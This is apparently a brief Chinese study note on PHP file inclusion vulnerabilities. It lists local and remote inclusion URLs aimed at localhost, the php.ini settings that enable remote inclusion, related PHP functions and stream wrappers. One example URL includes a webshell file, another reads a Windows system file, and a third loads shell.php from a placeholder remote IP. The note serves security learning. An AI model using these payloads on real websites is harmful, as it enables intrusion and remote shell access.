# 

# 文件包含漏洞

## 本地文件包含

```
http://localhost/fileinc/include.php?file=webshell.php
```

```
http://localhost/fileinc/include.php?file=C:\Windows\system.ini
```

​	

## 远程文件包含

```
http://localhost/fileinc/include.php?file=http://远程IP/shell.php
```

php.ini前提配置:

- `allow_url_fopen = on` //默认打开 
- `sllow_url_include=on` //这个是比较危险的选项，默认关闭

​	

## 相关函数

- [include()](https://www.php.net/manual/zh/function.
  include.php)
- [include_once()](https://www.php.net/manual/zh/function.
  include-once.php)
- [require()](https://www.php.net/manual/zh/function.
  require.php)
- [require_once()](https://www.php.net/manual/zh/function.
  require-once.php)
- [fopen()](https://www.php.net/manual/zh/function.
  fopen.php)
- [readfile()](https://www.php.net/manual/zh/function.
  readfile.php)
- [highlight_file()](https://www.php.net/manual/zh/function.
  highlight-file.php)
- [show_source()](https://www.php.net/manual/zh/function.
  show-source.php)
- [file_get_contents()](https://www.php.net/manual/zh/function.
  file-get-contents.php)
- [file()](https://www.php.net/manual/zh/function.
  file.php)

​	

## 伪协议

- `file://`——访问本地文件系统

- `http://`——访问 HTTP(s) 网址

- `ftp://`——访问 FTP(s) URLs

- `php://`——访问各个输入/输出流(I/O streams)

- `zlib://`——压缩流

- `data://`——数据(RFC 2379)

- `glob://`——查找匹配的文件路径模式

- `phar://`——PHP 归档

- `ssh2://`——Secure Shell 2

- `rar://`——RAR

- `og://`——音频流

- `expect://`——处理交互式的流

  
